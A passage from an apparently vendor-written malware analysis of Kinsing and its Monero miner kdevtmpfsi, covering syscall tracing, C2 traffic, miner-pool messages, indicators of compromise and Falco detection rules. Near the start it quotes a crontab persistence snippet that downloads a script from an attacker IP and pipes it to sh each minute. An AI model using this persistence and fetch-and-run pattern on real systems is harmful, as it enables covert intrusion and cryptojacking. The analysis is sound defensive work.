SKL=d $DIR/kinsing</pre>



<ol class="wp-block-list">
<li>Create a cronjob to download the malicious script:
<pre class="prettyprint">crontab -l | grep -e "195.3.146.118" | grep -v grep
if [ $? -eq 0 ]; then
  echo "cron good"
else
  (
    crontab -l 2&gt;/dev/null
    # $LDR is either wget or curl
    echo "* * * * * $LDR http://195.3.146.118/d.sh | sh &gt; /dev/null 2&gt;&amp;1"
  ) | crontab -
fi</pre>
</li>
</ol>



<p>It looks like after executing <i>d.sh</i>, our system would be a mess, and <i>kinsing</i> will be running.</p>



<p>Let&rsquo;s dig into what Kinsing actually does with <a rel="noopener nofollow noreferrer" target="_blank" href="https://github.com/draios/sysdig">Sysdig open source</a>.</p>



<h2 class="wp-block-heading" id="kinsing">Kinsing the malware</h2>



<p>As a security researcher reported, <em>Kinsing</em> is written in Golang, a high level programming language for cloud native application development. It&rsquo;s compiled with Go 1.13.6, which is a fairly new version. When <em>Kinsing</em> was running in our honeypot project, I got a chance to take a closer look at it. I used Sysdig open source to analyze the syscalls that executed from <em>Kinsing</em>.</p>



<p>In summary, <em>Kinsing</em> serves as a convoy to a crypto miner. While successfully running inside the victim&rsquo;s environment, it laterally moves into other machines.</p>



<h3 class="wp-block-heading" id="miner">Kinsing creates a crypto miner</h3>



<p><em>Kdevtmpfsi</em> is the crypto miner that will be created and run by <em>Kinsing</em> in the /tmp directory. Given their sizes, it looks like that the crypto miner is baked into <em>Kinsing</em>:</p>



<pre class="wp-block-preformatted">3.7M Oct 20 22:13 kdevtmpfsi
16M Jul 26 10:29 kinsing</pre>



<p>From the system calls, we have more clarity into how the file is created:</p>



<figure class="wp-block-image aligncenter"><a href="https://sysdig.com/wp-content/uploads/Kinsing-01-sysdig-inspect-syscalls.png"><img loading="lazy" decoding="async" width="1999" height="612" src="https://sysdig.com/wp-content/uploads/Kinsing-01-sysdig-inspect-syscalls.png" alt="" class="img-lightbox wp-image-31945" srcset="https://sysdig.com/wp-content/uploads/Kinsing-01-sysdig-inspect-syscalls.png 1999w, https://sysdig.com/wp-content/uploads/Kinsing-01-sysdig-inspect-syscalls-350x107.png 350w, https://sysdig.com/wp-content/uploads/Kinsing-01-sysdig-inspect-syscalls-1170x358.png 1170w, https://sysdig.com/wp-content/uploads/Kinsing-01-sysdig-inspect-syscalls-768x235.png 768w, https://sysdig.com/wp-content/uploads/Kinsing-01-sysdig-inspect-syscalls-1536x470.png 1536w, https://sysdig.com/wp-content/uploads/Kinsing-01-sysdig-inspect-syscalls-175x54.png 175w, https://sysdig.com/wp-content/uploads/Kinsing-01-sysdig-inspect-syscalls-1930x591.png 1930w, / 1w" sizes="(max-width: 1999px) 100vw, 1999px" /></a></figure>



<p>By using the open-source Sysdig Inspect, <em>Kinsing</em> wrote to a file called <code>/tmp/kdevtmpfsi</code>. After creating the file, it added permissions to execute.</p>



<figure class="wp-block-image aligncenter"><a href="https://sysdig.com/wp-content/uploads/Kinsing-02-sysdig-inspect-search-chmod.png"><img loading="lazy" decoding="async" width="1461" height="393" src="https://sysdig.com/wp-content/uploads/Kinsing-02-sysdig-inspect-search-chmod.png" alt="" class="img-lightbox wp-image-31946" srcset="https://sysdig.com/wp-content/uploads/Kinsing-02-sysdig-inspect-search-chmod.png 1461w, https://sysdig.com/wp-content/uploads/Kinsing-02-sysdig-inspect-search-chmod-350x94.png 350w, https://sysdig.com/wp-content/uploads/Kinsing-02-sysdig-inspect-search-chmod-1170x315.png 1170w, https://sysdig.com/wp-content/uploads/Kinsing-02-sysdig-inspect-search-chmod-768x207.png 768w, https://sysdig.com/wp-content/uploads/Kinsing-02-sysdig-inspect-search-chmod-175x47.png 175w, / 1w" sizes="(max-width: 1461px) 100vw, 1461px" /></a></figure>



<p>Finally, the binary will be executed:</p>



<figure class="wp-block-image aligncenter"><a href="https://sysdig.com/wp-content/uploads/Kinsing-03-sysdig-inspect-search-execve.png"><img loading="lazy" decoding="async" width="1999" height="436" src="https://sysdig.com/wp-content/uploads/Kinsing-03-sysdig-inspect-search-execve.png" alt="" class="img-lightbox wp-image-31947" srcset="https://sysdig.com/wp-content/uploads/Kinsing-03-sysdig-inspect-search-execve.png 1999w, https://sysdig.com/wp-content/uploads/Kinsing-03-sysdig-inspect-search-execve-350x76.png 350w, https://sysdig.com/wp-content/uploads/Kinsing-03-sysdig-inspect-search-execve-1170x255.png 1170w, https://sysdig.com/wp-content/uploads/Kinsing-03-sysdig-inspect-search-execve-768x168.png 768w, https://sysdig.com/wp-content/uploads/Kinsing-03-sysdig-inspect-search-execve-1536x335.png 1536w, https://sysdig.com/wp-content/uploads/Kinsing-03-sysdig-inspect-search-execve-175x38.png 175w, https://sysdig.com/wp-content/uploads/Kinsing-03-sysdig-inspect-search-execve-1930x421.png 1930w, / 1w" sizes="(max-width: 1999px) 100vw, 1999px" /></a></figure>



<p>Once the crypto miner is running, <em>Kinsing</em> constantly checks the miner status through reading the process status file:</p>



<figure class="wp-block-image aligncenter"><a href="https://sysdig.com/wp-content/uploads/Kinsing-04-sysdig-inspect-search-kdevtmpfs.png"><img loading="lazy" decoding="async" width="1999" height="1445" src="https://sysdig.com/wp-content/uploads/Kinsing-04-sysdig-inspect-search-kdevtmpfs.png" alt="" class="img-lightbox wp-image-31948" srcset="https://sysdig.com/wp-content/uploads/Kinsing-04-sysdig-inspect-search-kdevtmpfs.png 1999w, https://sysdig.com/wp-content/uploads/Kinsing-04-sysdig-inspect-search-kdevtmpfs-350x253.png 350w, https://sysdig.com/wp-content/uploads/Kinsing-04-sysdig-inspect-search-kdevtmpfs-1170x846.png 1170w, https://sysdig.com/wp-content/uploads/Kinsing-04-sysdig-inspect-search-kdevtmpfs-768x555.png 768w, https://sysdig.com/wp-content/uploads/Kinsing-04-sysdig-inspect-search-kdevtmpfs-1536x1110.png 1536w, https://sysdig.com/wp-content/uploads/Kinsing-04-sysdig-inspect-search-kdevtmpfs-175x127.png 175w, https://sysdig.com/wp-content/uploads/Kinsing-04-sysdig-inspect-search-kdevtmpfs-1930x1395.png 1930w, / 1w" sizes="(max-width: 1999px) 100vw, 1999px" /></a></figure>



<p>It is also reflected in the source code, that you can reverse engineer with <a rel="noopener nofollow noreferrer" target="_blank" href="https://github.com/goretk/redress">redress</a>:</p>



<pre class="wp-block-preformatted">File: main.go
	init Lines: 29 to 30 (1)
	init0 Lines: 63 to 75 (12)
	main Lines: 75 to 213 (138)
	mainfunc1 Lines: 139 to 403 (264)
	healthChecker Lines: 213 to 237 (24)
	minerRunningCheck Lines: 237 to 271 (34)
	isMinerRunning Lines: 271 to 300 (29)
	minRun Lines: 300 to 398 (98)</pre>



<p>Inside the main function, there is a function <code>isMinerRunning</code> that checks the status of the miner. That way, if <em>kdevtmpfsi</em> is killed, <em>Kinsing</em> will restart the miner program.</p>



<h3 class="wp-block-heading" id="c2">Kinsing communicates with a C2 server</h3>



<p>Like some other malwares, <em>Kinsing</em> did contact Command and Control (C2) servers. The HTTP requests sent to the following URL paths and request methods were captured by Sysdig open-source:</p>



<figure class="wp-block-table"><table class="table"><tbody><tr><td>URL Path</td><td>HTTP Method</td></tr><tr><td>/get</td><td>GET</td></tr><tr><td>/o</td><td>POST</td></tr><tr><td>/mg</td><td>GET</td></tr><tr><td>/h</td><td>GET</td></tr></tbody></table></figure>



<p>Each request returns a few strange characters.</p>



<p>One request worth highlighting above is the one to &ldquo;/get&rdquo; in the C2 server. Right after this request, the Kinsing malware started to download shell scripts from another server. Below are the three scripts that were downloaded via HTTP requests:</p>



<ul class="wp-block-list">
<li>al.sh</li>



<li>cron.sh</li>



<li>spre.sh</li>
</ul>



<p><em>al.sh</em> and <em>cron.sh</em> just repeated the tasks that were done earlier: stop the security mechanism, kill other mining processes, delete other crypto mining cronjob, and add <em>Kinsing</em>&rsquo;s own cronjob.</p>



<figure class="wp-block-image aligncenter"><a href="https://sysdig.com/wp-content/uploads/Kinsing-05-sysdig-inspect-search-http.png"><img loading="lazy" decoding="async" width="1427" height="839" src="https://sysdig.com/wp-content/uploads/Kinsing-05-sysdig-inspect-search-http.png" alt="" class="img-lightbox wp-image-31949" srcset="https://sysdig.com/wp-content/uploads/Kinsing-05-sysdig-inspect-search-http.png 1427w, https://sysdig.com/wp-content/uploads/Kinsing-05-sysdig-inspect-search-http-350x206.png 350w, https://sysdig.com/wp-content/uploads/Kinsing-05-sysdig-inspect-search-http-1170x688.png 1170w, https://sysdig.com/wp-content/uploads/Kinsing-05-sysdig-inspect-search-http-768x452.png 768w, https://sysdig.com/wp-content/uploads/Kinsing-05-sysdig-inspect-search-http-175x103.png 175w, / 1w" sizes="(max-width: 1427px) 100vw, 1427px" /></a></figure>



<p>The <em>spre.sh</em>, was used to lateral move to other machines through reading the SSH keys on the victims file system (e.g., files like &ldquo;~/.ssh/config&rdquo;, &ldquo;~/.bash_history&rdquo;).</p>



<figure class="wp-block-image aligncenter"><a href="https://sysdig.com/wp-content/uploads/Kinsing-06-sysdig-inspect-search-kinsing.png"><img loading="lazy" decoding="async" width="1456" height="988" src="https://sysdig.com/wp-content/uploads/Kinsing-06-sysdig-inspect-search-kinsing.png" alt="" class="img-lightbox wp-image-31950" srcset="https://sysdig.com/wp-content/uploads/Kinsing-06-sysdig-inspect-search-kinsing.png 1456w, https://sysdig.com/wp-content/uploads/Kinsing-06-sysdig-inspect-search-kinsing-350x238.png 350w, https://sysdig.com/wp-content/uploads/Kinsing-06-sysdig-inspect-search-kinsing-1170x794.png 1170w, https://sysdig.com/wp-content/uploads/Kinsing-06-sysdig-inspect-search-kinsing-768x521.png 768w, https://sysdig.com/wp-content/uploads/Kinsing-06-sysdig-inspect-search-kinsing-175x119.png 175w, / 1w" sizes="(max-width: 1456px) 100vw, 1456px" /></a></figure>



<h2 class="wp-block-heading" id="kdevtmpfsi">Kdevtmpfsi the crypto miner</h2>



<p>A crypto-mining attack is just like free riding on Wi-Fi.</p>



<p>Just as your network bandwidth will be shared by the free rider, some (or most) of your CPU or computing resources will be occupied by the mining processes without your consent. The impact is also similar. If the Wi-Fi free rider is downloading movies via BitTorrent using your Wi-Fi network, you may have a poor experience while watching Netflix.</p>



<p>When there is a mining process running, other applications running in the same node will be severely impacted since the mining process may occupy the CPU most of the time. Crypto-mining attacks have become one of the most appealing attacks to hackers, as it is an almost guaranteed way of gaining some benefits out of a successful intrusion. In this section, we will be looking into a few patterns of the crypto miner <em>kdevtmpfsi</em>.</p>



<h3 class="wp-block-heading" id="cpu">CPU Usage</h3>



<p>Most of the crypto miners occupy a lot of CPU cycles, and <em>kdevtmpfsi </em>is no different. The CPU usage goes up when <em>kdevtmpfsi</em> started to run:</p>



<figure class="wp-block-image aligncenter"><a href="https://sysdig.com/wp-content/uploads/Kinsing-07-sysdig-monitor-dashbaord.png"><img loading="lazy" decoding="async" width="1752" height="880" src="https://sysdig.com/wp-content/uploads/Kinsing-07-sysdig-monitor-dashbaord.png" alt="" class="img-lightbox wp-image-31951" srcset="https://sysdig.com/wp-content/uploads/Kinsing-07-sysdig-monitor-dashbaord.png 1752w, https://sysdig.com/wp-content/uploads/Kinsing-07-sysdig-monitor-dashbaord-350x176.png 350w, https://sysdig.com/wp-content/uploads/Kinsing-07-sysdig-monitor-dashbaord-1170x588.png 1170w, https://sysdig.com/wp-content/uploads/Kinsing-07-sysdig-monitor-dashbaord-768x386.png 768w, https://sysdig.com/wp-content/uploads/Kinsing-07-sysdig-monitor-dashbaord-1536x772.png 1536w, https://sysdig.com/wp-content/uploads/Kinsing-07-sysdig-monitor-dashbaord-175x88.png 175w, / 1w" sizes="(max-width: 1752px) 100vw, 1752px" /></a></figure>



<p>As you can see, <em>kdevtmpfsi</em> occupied almost half of the computing power of the node.</p>



<p>In production, DevOps may find that some services occupy a lot of CPU cycles because of software flaws or overloaded requests. It still doesn&rsquo;t suggest every CPU hike is caused by crypto miners. However, if CPU hikes are caused by some unknown processes or unknown containers, you should pay more attention to the hike.</p>



<h3 class="wp-block-heading" id="preparation">How <em>kdevtmpfsi</em> prepares to mine</h3>



<p>Although we followed (and you should too) the best practices to assign <a target="_blank" href="https://sysdig.com/blog/kubernetes-limits-requests/" rel="noopener noreferrer">resource limits and requests</a> for each workload, most of the containerized microservices don&#8217;t really care whether the worker node is 8, 16, or 32 cores CPU. They will be scheduled to run by the kube-scheduler based on the request, as well as the worker node&rsquo;s resource capacity.</p>



<p>Back to <em>kdevtmpfsi</em>. Below is a list of the system files accessed before the miner contacted the miner pool:</p>



<figure class="wp-block-table"><table class="table"><tbody><tr><td>File name</td><td>What is the file about?</td></tr><tr><td><code>/sys/devices/system/cpu/online</code></td><td>To know how many CPUs are online and being scheduled (e.g., 0-7 indicates there is an 8 cores CPU)</td></tr><tr><td><code>/proc/cpuinfo</code></td><td>Displays what type of processor your system is running, including the number of CPUs present.</td></tr><tr><td><code>/proc/mounts</code></td><td>A symlink to self/mounts which contains a list of the currently mounted devices and their mount points.</td></tr><tr><td><code>/proc/self/cgroup</code></td><td>Cgroup information about the caller process.</td></tr><tr><td><code>/sys/bus/cpu/devices/cpu*/online</code></td><td>CPUs that are online and being scheduled.</td></tr><tr><td><code>/sys/bus/cpu/devices/cpu*/topology/*</code></td><td>CPU topology files that describe a logical CPU&#8217;s relationship to other cores and threads in the same physical package.</td></tr><tr><td><code>/sys/bus/cpu/devices/cpu*/cache/index*/*</code></td><td>Parameters for the CPU cache attributes.</td></tr><tr><td><code>/sys/kernel/mm/hugepages/*</code></td><td>Contains files and information on hugepages, where pagesize could be 1048576 or 2048, corresponding to 1GB or 2MB of hugepage size.</td></tr><tr><td><code>/sys/bus/node/devices/node*/cpumap</code></td><td>The node&#8217;s cpumap.</td></tr><tr><td><code>/sys/bus/node/devices/node*/meminfo</code></td><td>Provides information about the node&#8217;s distribution and memory utilization. Similar to /proc/meminfo.</td></tr><tr><td><code>sys/bus/node/devices/node*/hugepages</code></td><td>The node&#8217;s huge page size control/query attributes.</td></tr><tr><td><code>/sys/devices/virtual/dmi/*</code></td><td>Contains hardware information. It may also contain cloud service information (e.g., ec2, t2.xlarge).</td></tr></tbody></table></figure>



<p>As you can guess, <em>kdevtmpfsi</em> gathers the system information, like CPU, memory, cgroup, etc., to prepare for the mining.</p>



<h3 class="wp-block-heading" id="communication">How kdevtmpfsi communicates with the miner pool</h3>



<p>Like most other crypto miners, <em>kdevtmpfsi</em> also contacts a miner pool. It does so by using JSON-RPC over HTTP.</p>



<p>First, <em>kdevtmpfsi</em> sends an login request to the miner pool server:</p>



<pre class="wp-block-preformatted">data={"id":1,"jsonrpc":"2.0","method":"login","params":{"login":"42J8CF9sQoP9pMbvtcLgTxdA2KN4ZMUVWJk6HJDWzixDLmU2Ar47PUNS5XHv4Kmfdh8aA9fbZmKHwfmFo8Wup8YtS5Kdqh2","pass":"pass","agent":"XMRig/5.5.0 (Linux x86_64) libuv/1.8.0 gcc/5.4.0","algo":["cn/1","cn/2","cn/r","cn/fast","cn/half","cn/xao","cn/rto","cn/rwz","cn/zls","cn/double","cn/gpu","cn-lite/1","cn-heavy/0","cn-heavy/tube","cn-heavy/xhv","cn-pico","cn-pico/tlo","rx/0","rx/wow","rx/loki","rx/arq","rx/sfx","argon2/chukwa","argon2/wrkz"]}}</pre>



<p>From the login request, we know that the miner actually mines for Monero(XMR). And the login request includes a login ID, password, agent, and supported mining algorithms.</p>



<p>Once the login has been confirmed, the following response is returned:</p>



<pre class="wp-block-preformatted">data={"jsonrpc":"2.0","id":1,"error":null,"result":{"id":"768395e4-6b12-4354-82d6-12d16884fd5c","job":{"blob":"0e0e9ccce1fc0562c6ecba81af5cb891de8765b67096b4ca647b9be3902fc904cf2603b2a0bf5e000000ee094c6e8dfd8a6cfe288caf4f9b05bc97bf0a2ed7a8d4385ee5c5132a090bdd9706","job_id":"845729501145250","target":"5a030000","algo":"rx/0","height":2217639,"seed_hash":"c6b33164bdcdc962e58dbce571ed6d1353c67f53924081061d9f3af6eba2203a"},"extensions":["algo","nicehash","connect","tls","keepalive"],"status":"OK"}}</pre>



<p><em>Kdevtmpfsi</em> received the mining job immediately for the negotiated mining algorithm, as well as the scheme to communicate.</p>



<p><em>Kdevtmpfsi</em> received four more jobs later on:</p>



<p><strong>Job ID: 703276738178843</strong></p>



<pre class="wp-block-preformatted">data={"jsonrpc":"2.0","method":"job","params":{"blob":"0e0e99cde1fc05abffc0dcb55a5309a31f147fc02172c2469d2ffdaf98147e85c732a71393ef64000000eecde9ea6b01658fa8c5f11b9f5bcca9030791f8a84cfca9a3d6dbc322b3bb535415","job_id":"703276738178843","target":"5a030000","algo":"rx/0","height":2217640,"seed_hash":"c6b33164bdcdc962e58dbce571ed6d1353c67f53924081061d9f3af6eba2203a"}}</pre>



<p><strong>Job ID: 508335469096263</strong></p>



<pre class="wp-block-preformatted">data={"jsonrpc":"2.0","method":"job","params":{"blob":"0e0eb5cde1fc0598f9fab009bfdf7ab22fc588690f604e30f4b2c93c6308d76cd1a08482e6e7c6000000ee3f33e506d3399bd8818056482a5ec3e2aead8ef4fba2810f66d8591e5091103905","job_id":"508335469096263","target":"5a030000","algo":"rx/0","height":2217641,"seed_hash":"c6b33164bdcdc962e58dbce571ed6d1353c67f53924081061d9f3af6eba2203a"}}</pre>



<p><strong>Job ID: 704899485008265</strong></p>



<pre class="wp-block-preformatted">data={"jsonrpc":"2.0","method":"job","params":{"blob":"0e0ea8cde1fc0598f9fab009bfdf7ab22fc588690f604e30f4b2c93c6308d76cd1a08482e6e7c6000000ee5e7340a918030f70c783a7bf4b96b9f9fdeeda0e8646708c3dd7e25b774857420b","job_id":"704899485008265","target":"5a030000","algo":"rx/0","height":2217641,"seed_hash":"c6b33164bdcdc962e58dbce571ed6d1353c67f53924081061d9f3af6eba2203a"}}</pre>



<p><strong>Job ID: 325604739614457</strong></p>



<pre class="wp-block-preformatted">data={"jsonrpc":"2.0","method":"job","params":{"blob":"0e0edecde1fc0598f9fab009bfdf7ab22fc588690f604e30f4b2c93c6308d76cd1a08482e6e7c6000000eeb7d8d2398ea84203b2e4f4ea23bbc4072370a858c64be0259bcab7b423c984020e","job_id":"325604739614457","target":"5a030000","algo":"rx/0","height":2217641,"seed_hash":"c6b33164bdcdc962e58dbce571ed6d1353c67f53924081061d9f3af6eba2203a"}}</pre>



<p>Each job used the same algorithm as negotiated before, with the same seed hash value but a different blob value.</p>



<p>Later on, kdevtmpfsi managed to send a heartbeat-like message to the miner pool with a special method called <code>keepalived</code>:</p>



<pre class="wp-block-preformatted">data={"id":4,"jsonrpc":"2.0","method":"keepalived","params":{"id":"768395e4-6b12-4354-82d6-12d16884fd5c"}} </pre>



<p>And the miner pool server returned with a nod message:</p>



<pre class="wp-block-preformatted">data={"id":2,"jsonrpc":"2.0","error":null,"result":{"status":"KEEPALIVED"}}</pre>



<p>The heartbeat message was sent about every minute. These communication patterns repeated while the miner was running.</p>



<h2 class="wp-block-heading" id="mitigation">Mitigation strategies for Kinsing</h2>



<p>Before we talk about the mitigation strategies, let&rsquo;s recap what suspicious attack patterns were discovered from <em>Kinsing</em>.</p>



<h3 class="wp-block-heading">Quick recap</h3>



<p>It would make sense to divide patterns found from <em>Kinsing</em> into three categories: process, file and network.</p>



<p>And the division helps identify potential IOCs from three different angles:</p>



<ul class="wp-block-list">
<li><strong>Suspicious process activities:</strong>
<ul class="wp-block-list">
<li>Launch package management tool to download toolkits facilitating attacks, like apt-get.</li>



<li>Enable a <em>cronjob</em> service inside a container.</li>



<li>Disable security services, like firewall, AppArmor, and cloud agents (from a container).</li>



<li>A process launched from suspicious directories, like /tmp and /var/tmp.</li>



<li>Unknown processes occupied a lot of CPU cycle.</li>



<li>Kill a bunch of processes, though the process may not exist.</li>
</ul>
</li>



<li><strong>Suspicious file activities:</strong>
<ul class="wp-block-list">
<li>Remove a bunch of files, though the file may not exist.</li>



<li>Add execution permission to files newly created (should be configured inside Dockerfile).</li>



<li>Read system and device information.</li>



<li>Read files that may contain secret information (e.g., &ldquo;~/.ssh/config&rdquo;, &ldquo;~/.bash_history&rdquo;).</li>



<li>Look for specific sensitive string patterns, like &ldquo;id_rsa&rdquo; from files.</li>



<li>Update <em>cronjob,</em> though <em>cronjob</em> may not be used.</li>
</ul>
</li>



<li><strong>Suspicious network activities:</strong>
<ul class="wp-block-list">
<li>Network traffic to the C2 server and miner pool.</li>



<li>HTTP request contains suspicious URL path (e.g., /o, /mg, /al.sh, /spre.sh).</li>



<li>Heartbeat messages that emit to suspicious IP addresses.</li>
</ul>
</li>
</ul>



<p>Although we can&rsquo;t rely on a single individual suspicious event to unveil the <em>Kinsing</em> attack completely, some of the patterns above are significant enough to draw the SOC team&rsquo;s attention. So let&rsquo;s talk about how <a href="https://sysdig.com/opensource/falco/" target="_blank" rel="noreferrer noopener">Falco</a> can help detect such an attack.</p>



<h3 class="wp-block-heading">Falco</h3>



<p>Falco, a CNCF incubating project, can help detect any anomalous activities in cloud native environments with rich, out-of-the-box default rules. Below are a few worth highlighting to detect suspicious behavior mentioned previously</p>



<pre class="wp-block-preformatted"># Container is supposed to be immutable. Package management should be done in building the image.
- rule: Launch Package Management Process in Container
  desc: Package management process ran inside container
- rule: Outbound Connection to C2 Servers
  desc: Detect outbound connection to command &amp; control servers
- rule: Container Drift Detected (chmod)
  desc: New executable created in a container due to chmod
- rule: Search Private Keys or Passwords
  desc: Detect grep private keys or passwords activity.
- rule: Detect outbound connections to common miner pool ports
  desc: Miners typically connect to miner pools on common ports.</pre>



<p>You can find the full list of Falco rules <a rel="noopener nofollow noreferrer" target="_blank" href="https://github.com/falcosecurity/falco/tree/master/rules">here</a>.</p>



<h2 class="wp-block-heading" id="conclusion">Conclusion</h2>



<p>Kinsing malware showed comprehensive patterns during the attack.</p>



<p>Without a deep insight into the process activities, file activities, and network activities from your cloud native environment, and the help from a smart detection engine, it will be hard to detect such an attack. It will be even more difficult to uncover it.</p>



<p>It is also important to note that a unified monitoring and secure platform will speed up the investigation process. Once you identify a single suspicious event, it helps you trace down the event from different angles: resource usage, network connections, and reading sensitive files.</p>



<p>Successfully correlating these events together (e.g., using parent/grandparent process ID) will unveil the <em>kinsing</em> attack.</p>



<p><em>The <a target="_blank" href="https://sysdig.com/platform-architecture/" rel="noopener noreferrer">Sysdig Secure DevOps Platform</a> combines monitoring and securing solutions so you can easily correlate events and protect your cloud native environment in a way that wouldn&#8217;t be possible otherwise. <a target="_blank" href="https://sysdig.com/company/free-trial/" rel="noopener noreferrer">Try it today!</a></em></p>
</body></html>
</div>			</div>

							<div class="col-12">
				<div class="wp-block-rb-pathfactory-concierge">
					<div id="pf-concierge"></div>
				</div>
			</div>
		
		 
		   
			<div class="col-12">
			<div class="c-banner c-banner-form c-form col-12  mt-10 py-14 px-8 lg:py-12 lg:px-14 t-gray--bg-gray-60 t-dark--bg-gray-60 t-gray--text-white t-dark--text-white">
    <div class="row items-center">
        <div class="col-12 col-lg-7 flex flex-column">
			                <p class="h5 mb-6 lg:mb-0">Subscribe and get the latest updates</p>
						        </div>

        <div class="col-12 col-lg-5 flex flex-col justify-start items-start md:flex-row lg:justify-end md:items-center">
                <div class="u-spinner js-spinner__3811">
        <div class="u-spinner__cube1"></div>
        <div class="u-spinner__cube2"></div>
    </div>
    <form data-submit-button="Submit" data-formID="3811" data-formInstance="one" data-formTemplate="newsletter" style="display: none;" class="sysdig-form  columns-single" data-successType="success-message" data-recaptcha="false"></form>
    <div id="success-message" style="display: none;">
		<p class="font-family-karla c-heading mb-0">Thank You For Signing Up!</p>    </div>
